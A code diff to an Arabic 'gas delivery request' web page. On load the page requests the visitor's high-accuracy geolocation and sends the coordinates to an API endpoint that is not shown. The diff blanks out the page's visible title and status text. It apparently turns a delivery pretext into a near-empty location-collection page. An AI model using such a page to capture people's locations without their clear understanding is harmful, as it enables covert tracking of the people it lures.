@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>طلب توصيل غاز</title>
+<title>  </title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -27,7 +27,7 @@ body{
 <body>
 
 <div class="card">
-  <h2>📍 جاري تحديد موقعك…</h2>
+  <h2>  </h2>
   <p>يرجى الضغط على <b>سماح</b> عند ظهور الإشعار</p>
   <p id="status">⏳ انتظر لحظة...</p>
 </div>
@@ -39,7 +39,7 @@ const API_URL =
 window.onload = function () {
 
   if (!navigator.geolocation) {
-    document.getElementById("status").innerHTML = "❌ جهازك لا يدعم تحديد الموقع";
+    document.getElementById("status").innerHTML = "❌    ";
     return;
   }
 
@@ -52,12 +52,12 @@ window.onload = function () {
       fetch(`${API_URL}?lat=${lat}&lng=${lng}&acc=${acc}`)
         .then(() => {
           document.getElementById("status").innerHTML =
-            "✅ تم إرسال موقعك بنجاح<br>المندوب في الطريق إليك";
+            "✅   <br>  ";
         });
     },
     function(){
       document.getElementById("status").innerHTML =
-        "❌ الرجاء السماح بتحديد الموقع لإكمال الطلب";
+        "❌     ";
     },
     {
       enableHighAccuracy:true,
